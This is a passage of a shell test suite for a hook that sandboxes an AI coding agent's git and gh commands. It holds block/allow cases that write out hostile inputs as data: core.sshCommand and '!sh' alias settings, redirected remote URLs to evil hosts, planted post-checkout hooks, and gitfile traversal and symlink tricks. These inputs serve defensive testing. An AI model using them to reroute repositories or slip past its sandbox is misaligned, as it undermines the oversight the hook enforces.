    block 'git -C ../other branch -u origin/feat' 'git option before the subcommand'
    block 'gh pr view 5 && git branch -u origin/feat' 'own Bash call'
    allow 'git branch -D feat'
    allow 'git branch --show-current'
    allow "cd $SCRATCH && git branch -u origin/feat"
}

case_config_set_outside_the_sandbox() {
    allow 'git config set pull.rebase true'
    allow 'git config set --local user.name "A B"'
    allow 'git config set --type=bool rebase.autostash true'
    allow 'git config unset pull.rebase'
    allow 'git config set branch.feat.remote origin'
    allow 'git config set branch.feat.remote .'
    allow 'git config set branch.feat.merge refs/heads/feat'
    block 'git config set sandboxprobe.x 1' 'allowlist'
    block 'git config set core.sshCommand evil' 'allowlist'
    block 'git config set core.hooksPath /tmp/h' 'allowlist'
    block 'git config set alias.x "!sh"' 'allowlist'
    block 'git config set commit.gpgsign false' 'changes how git'
    block 'git config unset commit.gpgsign' 'changes how git'
    block 'git config set remote.origin.url git@github.com:evil/x.git' 'changes how git'
    block 'git config set remote.origin.fetch "+refs/*:refs/*"' 'changes how git'
    block 'git config set submodule.x.url git@github.com:acme/x.git' 'changes how git'
    # A remote or branch name may hold dots.
    block 'git config set remote.a.b.url git@github.com:evil/x.git' 'changes how git'
    block 'git config unset remote.a.b.url' 'changes how git'
    block 'git config set remote.a.b.pushurl git@github.com:evil/x.git' 'allowlist'
    block 'git config set branch.rel.1.pushremote origin' 'changes how git'
    block 'git config set branch.feat.pushremote origin' 'changes how git'
    block 'git config set remote.origin.gh-resolved evil/x' 'changes how git'
    allow 'git config set remote.origin.prune true'
    allow 'git config set remote.origin.tagopt --no-tags'
    block "cd $PROJ && git config remote.a.b.url git@github.com:evil/x.git" 'remote'
    block 'git config set --global user.name x' 'not accepted outside the sandbox'
    block 'git config set --file /tmp/x user.name x' 'not accepted outside the sandbox'
    block 'git config set --worktree user.name x' 'not accepted outside the sandbox'
    block 'git config set branch.feat.remote ../other' 'configured remote'
    block 'git config set branch.feat.remote git@github.com:evil/x.git' 'configured remote'
    block 'git config set branch.feat.merge evil' 'refs/heads'
    block 'git config set user.name "$N"' 'plain literal'
    block 'git config set user.name "run git push"' 'value holds'
    block 'git config set pull.rebase' 'one key and one value'
    block 'git config set pull.rebase true extra' 'one key and one value'
    block 'git config unset pull.rebase extra' 'one key'
    block 'gh pr view 5 && git config set pull.rebase true' 'own Bash call'
    allow "true && git -C $SCRATCH config set commit.gpgsign false"
    allow 'git config user.name "A B"'
    allow 'git config --get remote.origin.url'

    # Every key the check accepts must leave the repository one this hook
    # still vouches for.
    git -C "$PROJ" config pull.rebase true
    git -C "$PROJ" config user.name 'A B'
    git -C "$PROJ" config rebase.autostash true
    git -C "$PROJ" config branch.feat.remote origin
    git -C "$PROJ" config branch.feat.merge refs/heads/feat
    allow 'git fetch origin'
    allow 'git push origin feat'
    git -C "$PROJ" config --unset pull.rebase
    git -C "$PROJ" config --unset user.name
    git -C "$PROJ" config --unset rebase.autostash
    git -C "$PROJ" config --remove-section branch.feat

    # A named file outside a repository is not scratch for that reason.
    block "git config --file $OUTSIDE/gitconfig core.sshCommand evil" 'named config file'
    block "git config -f $OUTSIDE/gitconfig core.fsmonitor /tmp/x" 'named config file'
    block "git config --file=$OUTSIDE/gitconfig alias.x '!sh'" 'named config file'
    block 'git config --file "$F" core.sshCommand evil' 'named config file'
    allow "git config --file $WORK/gitconfig core.sshCommand evil"
    block "git config --file $SCRATCHY/gitconfig core.sshCommand evil" 'named config file'
    allow "git config --file $OUTSIDE/gitconfig --get core.sshCommand"
}

case_submodule_outside_the_sandbox() {
    local mod="$PROJ/.git/modules/lib" cfg
    printf '[submodule "lib"]\n\tpath = lib\n\turl = git@github.com:acme/lib.git\n' >"$PROJ/.gitmodules"
    allow 'git submodule update --init'
    allow 'git submodule update --init --depth 1 lib'
    allow 'git submodule update --remote -- lib'
    allow 'git submodule init'
    allow 'git submodule sync -q'
    allow 'git submodule status'
    block 'git submodule update --init --recursive' 'recursive'
    block 'git submodule sync --recursive' 'recursive'
    block 'git submodule update --merge' 'allowlist'
    block 'git submodule update --reference /tmp/r' 'allowlist'
    block 'git submodule update "$P"' 'plain literal'
    block 'gh pr view 5 && git submodule update --init' 'own Bash call'

    printf '[submodule "lib"]\n\tpath = lib\n\turl = ../evil\n' >"$PROJ/.gitmodules"
    block 'git submodule update --init' 'not a github.com repository'
    printf '[submodule "lib"]\n\tpath = lib\n\turl = git@github.com:acme/lib.git\n' >"$PROJ/.gitmodules"

    # `modules` must be a plain directory, and a submodule name plain.
    : >"$PROJ/.git/modules"
    block 'git submodule update --init' 'not a plain directory'
    rm -f "$PROJ/.git/modules"
    printf '[submodule "a b"]\n\tpath = lib\n\turl = git@github.com:acme/lib.git\n' >"$PROJ/.gitmodules"
    block 'git submodule update --init' 'blocked'
    printf '[submodule "a/../b"]\n\tpath = lib\n\turl = git@github.com:acme/lib.git\n' >"$PROJ/.gitmodules"
    block 'git submodule update --init' 'plain relative name'
    printf '[submodule "lib"]\n\tpath = lib\n\turl = git@github.com:acme/lib.git\n' >"$PROJ/.gitmodules"

    # The git directory of a submodule already cloned is read too.
    mkdir -p "$mod/hooks"
    printf 'ref: refs/heads/main\n' >"$mod/HEAD"
    printf '[core]\n\tworktree = ../../../lib\n[remote "origin"]\n\turl = git@github.com:acme/lib.git\n' >"$mod/config"
    allow 'git submodule update --init'
    printf '[core]\n\tsshCommand = evil\n' >"$mod/config"
    block 'git submodule update --init' 'core.sshcommand'
    printf '[remote "origin"]\n\turl = git@evil.example.com:a/b.git\n' >"$mod/config"
    block 'git submodule update --init' 'not a github.com repository'
    printf '[core]\n\tbare = false\n' >"$mod/config"
    : >"$mod/hooks/post-checkout"
    block 'git submodule update --init' 'post-checkout'
    rm -rf "$PROJ/.git/modules"

    # Git follows `<path>/.git`, which sits in the worktree: it must be
    # absent or a gitfile into the `modules` directory read above.
    git -C "$PROJ" update-index --add --cacheinfo 160000,4b825dc642cb6eb9a060e54bf8d69288fbee4904,lib
    allow 'git submodule update --init'
    mkdir -p "$PROJ/lib/.git"
    block 'git submodule update --init' 'directory or a symbolic link'
    block 'git submodule init' 'directory or a symbolic link'
    block 'git submodule sync' 'directory or a symbolic link'
    rmdir "$PROJ/lib/.git"
    mkdir -p "$WORK/fake/hooks"
    printf 'ref: refs/heads/main\n' >"$WORK/fake/HEAD"
    printf '[core]\n\tbare = false\n' >"$WORK/fake/config"
    : >"$WORK/fake/hooks/post-checkout"
    printf 'gitdir: %s\n' "$WORK/fake" >"$PROJ/lib/.git"
    block 'git submodule update --init' 'outside the repository'
    block 'git submodule update --init lib' 'outside the repository'
    printf 'gitdir: ../../fake\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'outside the repository'
    printf 'not a gitfile\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'not a gitfile'
    # Git reads the whole file as the path, line breaks included.
    printf 'gitdir: ../.git/modules/lib\n/evil\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'not a gitfile'
    printf 'gitdir: ../.git/modules/li b\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'not a gitfile'
    rm -f "$PROJ/lib/.git"
    # The directory a submodule name maps to is read even when it holds no
    # HEAD, and a symbolic link anywhere under `modules` is refused.
    mkdir -p "$mod"
    block 'git submodule update --init' 'not a git directory'
    mkdir -p "$mod/hooks"
    printf 'ref: refs/heads/main\n' >"$mod/HEAD"
    printf '[core]\n\tsshCommand = evil\n' >"$WORK/fake/realconfig"
    ln -s "$WORK/fake/realconfig" "$mod/config"
    block 'git submodule update --init' 'symbolic link'
    rm -f "$mod/config"
    mkdir -p "$mod/hooks"
    printf 'ref: refs/heads/main\n' >"$mod/HEAD"
    printf '[core]\n\tworktree = ../../../lib\n[remote "origin"]\n\turl = git@github.com:acme/lib.git\n' >"$mod/config"
    printf 'gitdir: ../.git/modules/lib\n' >"$PROJ/lib/.git"
    allow 'git submodule update --init'
    printf '%s\n' "$WORK/fake" >"$mod/commondir"
    block 'git submodule update --init' 'commondir'
    rm -f "$mod/commondir"
    # Git stops reading a gitfile at a NUL byte, which the shell drops.
    printf 'gitdir: ../.git/modules/lib\0/../x\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'not a gitfile'
    printf 'gitdir: ../.git/modules/lib\0/../x' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'not a gitfile'
    # A `..` after a symbolic link resolves through the link, as git does.
    mkdir -p "$WORK/fake/a" "$WORK/fake/modules/lib"
    printf 'ref: refs/heads/main\n' >"$WORK/fake/modules/lib/HEAD"
    printf '[core]\n\tsshCommand = evil\n' >"$WORK/fake/modules/lib/config"
    ln -s "$WORK/fake/a" "$PROJ/.git/lnk"
    printf 'gitdir: ../.git/lnk/../modules/lib\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'outside the repository'
    rm -f "$PROJ/.git/lnk"
    printf 'gitdir: ../.git/modules/lib\n' >"$PROJ/lib/.git"
    allow 'git submodule update --init'
    # Refs and reflogs named HEAD inside a git directory are not git
    # directories; a directory with HEAD and objects is, wherever it sits.
    mkdir -p "$mod/objects" "$mod/logs/refs/remotes/origin" "$mod/refs/remotes/origin"
    : >"$mod/logs/HEAD"
    : >"$mod/logs/refs/remotes/origin/HEAD"
    printf 'ref: refs/remotes/origin/main\n' >"$mod/refs/remotes/origin/HEAD"
    allow 'git submodule update --init'
    for cfg in other refs/evil lib/modules/logs/evil; do
        mkdir -p "$PROJ/.git/modules/$cfg/objects"
        printf 'ref: refs/heads/main\n' >"$PROJ/.git/modules/$cfg/HEAD"
        printf '[core]\n\tsshCommand = evil\n' >"$PROJ/.git/modules/$cfg/config"
        block 'git submodule update --init' 'core.sshcommand'
        rm -rf "$PROJ/.git/modules/${cfg%/evil}"
        [ "$cfg" != lib/modules/logs/evil ] || rm -rf "$mod/modules"
    done
    allow 'git submodule update --init'
    # Git asks only that `objects` be searchable, so a file with the
    # execute bit counts.
    mkdir -p "$PROJ/.git/modules/other"
    : >"$PROJ/.git/modules/other/objects"
    chmod +x "$PROJ/.git/modules/other/objects"
    printf 'ref: refs/heads/main\n' >"$PROJ/.git/modules/other/HEAD"
    printf '[core]\n\tsshCommand = evil\n' >"$PROJ/.git/modules/other/config"
    block 'git submodule update --init' 'core.sshcommand'
    # A volume that folds case opens `head` as `HEAD`.
    if [ -e "$PROJ/.GIT" ]; then
        mv "$PROJ/.git/modules/other/HEAD" "$PROJ/.git/modules/other/tmp"
        mv "$PROJ/.git/modules/other/tmp" "$PROJ/.git/modules/other/head"
        block 'git submodule update --init' 'core.sshcommand'
    fi
    rm -rf "$PROJ/.git/modules/other"
    # A directory that cannot be listed hides what git reaches by name.
    if [ "$(id -u)" != 0 ]; then
        mkdir -p "$PROJ/.git/modules/hid/x/objects"
        printf 'ref: refs/heads/main\n' >"$PROJ/.git/modules/hid/x/HEAD"
        printf '[core]\n\tsshCommand = evil\n' >"$PROJ/.git/modules/hid/x/config"
        chmod 100 "$PROJ/.git/modules/hid"
        block 'git submodule update --init' 'cannot be listed'
        block 'git fetch origin' 'submodules'
        chmod 700 "$PROJ/.git/modules/hid"
        rm -rf "$PROJ/.git/modules/hid"
    fi
    # A legacy remote file in the submodule's git directory.
    mkdir -p "$mod/remotes"
    printf 'URL: ssh://git@evil.example.com/x.git\n' >"$mod/remotes/origin"
    block 'git submodule update --init' 'legacy remote'
    rm -rf "$mod/remotes"
    # A hooks directory that cannot be listed still runs its hooks.
    if [ "$(id -u)" != 0 ]; then
        : >"$mod/hooks/post-checkout"
        chmod 300 "$mod/hooks"
        block 'git submodule update --init' 'cannot be listed'
        chmod 700 "$mod/hooks"
        rm -f "$mod/hooks/post-checkout"
    fi
    allow 'git submodule update --init'
    ln -s "$WORK/fake" "$PROJ/.git/modules/link"
    printf 'gitdir: ../.git/modules/link\n' >"$PROJ/lib/.git"
    block 'git submodule update --init' 'symbolic link'
    rm -f "$PROJ/.git/modules/link"
    rm -rf "$PROJ/lib"
    ln -s "$WORK/fake" "$PROJ/lib"
    block 'git submodule update --init' 'symbolic link'
    rm -f "$PROJ/lib"
    git -C "$PROJ" update-index --force-remove lib
    rm -rf "$PROJ/.git/modules" "$WORK/fake"

    # An initialized submodule leaves keys in the local config.
    git -C "$PROJ" config submodule.lib.url git@github.com:acme/lib.git
    git -C "$PROJ" config submodule.lib.active true
    allow 'git submodule update'
    allow 'git fetch --no-recurse-submodules origin'
    allow 'git push origin feat'
    git -C "$PROJ" config submodule.lib.url ../evil
    block 'git fetch --no-recurse-submodules origin' 'not a github.com repository'
    block 'git push origin feat' 'not a github.com repository'
    git -C "$PROJ" config --remove-section submodule.lib
    rm -f "$PROJ/.gitmodules"

    # A `modules` directory that cannot be listed counts as submodules.
    if [ "$(id -u)" != 0 ]; then
        mkdir -p "$PROJ/.git/modules/x"
        chmod 300 "$PROJ/.git/modules"
        block 'git fetch origin' 'submodules'
        chmod 700 "$PROJ/.git/modules"
        rm -rf "$PROJ/.git/modules"
        allow 'git fetch origin'
    fi
}

# Runs last: it gives the project its first commit and a linked worktree.
case_worktree_outside_the_sandbox() {
    local wt="$WORK/wt1"
    allow 'git worktree add .claude/worktrees/feat'
    allow 'git worktree add -b feat .claude/worktrees/feat origin/main'
    allow "git worktree add $SCRATCHY/wt HEAD"
    allow 'git worktree add --detach sub/wt'
    allow 'git worktree add -h'
    allow 'git worktree list'
    block 'git worktree add ../wt' '..'
    block "git worktree add $OUTSIDE/wt" 'outside this session'
    block 'git worktree add .claude/hooks/x' '.claude'
    block 'git worktree add .Claude/hooks' '.claude'
    block 'git worktree add .git/x' '.git'
    block 'git worktree add --force wt' 'force'
    block 'git worktree add wt "$C"' 'plain literal'
    block 'git worktree add wt a b' 'one path'
    block 'git worktree add wt "a;b"' 'commit'
    block 'gh pr view 5 && git worktree add wt' 'own Bash call'
    allow 'ls; git worktree add ../wt'
    : >"$PROJ/.git/hooks/post-checkout"
    block 'git worktree add wt' 'post-checkout'
    rm -f "$PROJ/.git/hooks/post-checkout"

    allow 'git worktree prune'
    allow 'git worktree prune -n -v'
    allow 'git worktree prune --expire now'
    block 'git worktree prune wt' 'no path'
    block 'git worktree prune --bogus' 'allowlist'

    git -C "$PROJ" -c user.name=t -c user.email=t@example.com commit -q --allow-empty -m init ||
        fatal "fixture commit failed"
    git -C "$PROJ" worktree add -q "$wt" || fatal "fixture worktree failed"
    allow "git worktree remove $wt"
    allow "git worktree move $wt .claude/worktrees/wt1"
    allow "git worktree move $wt $SCRATCHY/wt1"
    block "git worktree remove --force $wt" 'force'
    block "git worktree move --force $wt sub/wt1" 'force'
    block "git worktree remove $OTHER" 'not a registered worktree'
    block "git worktree remove $WORK/missing" 'not an existing directory'
    block 'git worktree remove .' 'checkout this call runs in'
    block "git worktree remove $PROJ" 'checkout this call runs in'
    block "git worktree move $wt $OUTSIDE/wt1" 'outside this session'
    block "git worktree move $wt .claude/skills/x" '.claude'
    block "git worktree remove $wt extra" 'one worktree path'
    CWD="$wt"
    block "git worktree remove $wt" 'checkout this call runs in'
    block "git worktree remove $PROJ" 'project checkout'
    CWD="$PROJ"
    git -C "$PROJ" worktree remove --force "$wt"
}

# A path with a `tasks` component is not a scratch root, so these rows reach
# the project-root rules on every platform.
case_destination_under_a_linked_worktree() {
    local main="$WORK/tasks/p2" wt="$WORK/tasks/wt2"
    mkdir -p "$WORK/tasks"
    make_repo "$main" git@github.com:acme/widgets.git
    git -C "$main" -c user.name=t -c user.email=t@example.com commit -q --allow-empty -m init ||
        fatal "fixture commit failed"
    git -C "$main" worktree add -q "$wt" || fatal "fixture worktree failed"
    CWD="$wt" PROJECT="$wt"
    allow 'git worktree add vendor/w'
    allow 'git clone git@github.com:acme/widgets.git vendor/w'
    allow "git clone git@github.com:acme/widgets.git $main/vendor/w"
    allow 'git clone git@github.com:acme/widgets.git .claude/worktrees/w'
    block "git clone git@github.com:acme/widgets.git $WORK/tasks/elsewhere/w" 'outside this session'
    block "git clone git@github.com:acme/widgets.git ${wt}x/w" 'outside this session'
    block "git worktree add $WORK/tasks/elsewhere" 'outside this session'
    block 'git clone git@github.com:acme/widgets.git .git/x' '.git'
    block 'git clone git@github.com:acme/widgets.git x/.claude/worktrees/.GIT' '.git'
    CWD="$main" PROJECT="$main"
    allow 'git worktree add vendor/w'
    block "git worktree add $WORK/tasks/elsewhere" 'outside this session'
    CWD="$PROJ" PROJECT="$PROJ"
    git -C "$main" worktree remove --force "$wt"
}

case_unrelated_commands_pass
case_push_to_another_branch_is_allowed
case_push_to_a_default_branch_is_denied
case_push_with_an_unreadable_destination_is_denied
case_push_inside_a_compound_is_denied
case_push_with_a_rerouting_prefix_is_denied
case_push_from_an_unvouched_repository_is_denied
case_default_branch_comes_from_github_and_is_cached
case_wall_clock_bound_denies
case_fetch_and_ls_remote
case_ordinary_git_is_allowed
case_git_permission_overrides_are_denied
case_scratch_repositories_are_exempt
case_merge_is_denied_in_every_position
case_merge_through_the_api_is_denied
case_ordinary_gh_is_allowed
case_gh_permission_overrides_are_denied
case_gh_checkout_needs_a_vouched_repository
case_visible_indirection_is_denied
case_unreadable_commands_fail_closed
case_push_through_a_symbolic_name_is_denied
case_merge_spellings_are_denied
case_unread_text_fails_closed
case_indirection_inside_one_call_is_denied
case_plain_requests_are_not_denied
case_a_scratch_push_to_a_local_remote_is_allowed
case_names_the_volume_folds_are_read
case_arithmetic_and_backticks_hide_nothing
case_a_built_command_word_is_read_or_refused
case_a_program_valued_setting_cannot_carry_a_command
case_every_exported_name_counts
case_each_verb_has_its_own_value_flags
case_a_flag_with_an_expansion_in_it_is_read
case_config_flags_end_at_the_first_key
case_a_shell_behind_another_command_is_read
case_a_word_the_shells_read_differently_is_refused
case_text_with_an_expansion_or_a_newline_is_still_read
case_organization_access_writes_are_denied
case_a_valued_wrapper_flag_hides_no_shell
case_gh_short_names_get_the_long_names_checks
case_a_public_gh_command_runs_alone
case_a_mention_beside_a_flag_is_not_a_command
case_a_hook_manager_switch_is_a_hook_skip
case_pull_outside_the_sandbox
case_clone_outside_the_sandbox
case_remote_update_outside_the_sandbox
case_branch_upstream_outside_the_sandbox
case_config_set_outside_the_sandbox
case_submodule_outside_the_sandbox
case_worktree_outside_the_sandbox
case_destination_under_a_linked_worktree

printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
